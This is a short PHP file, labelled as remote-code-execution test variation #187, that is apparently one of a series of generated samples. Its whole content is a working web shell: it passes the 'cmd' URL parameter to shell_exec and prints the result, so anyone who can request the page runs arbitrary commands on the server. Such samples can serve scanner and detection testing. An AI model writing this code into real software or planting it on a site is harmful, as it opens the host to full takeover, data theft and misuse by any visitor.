<?php
// RCE test variation #187
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>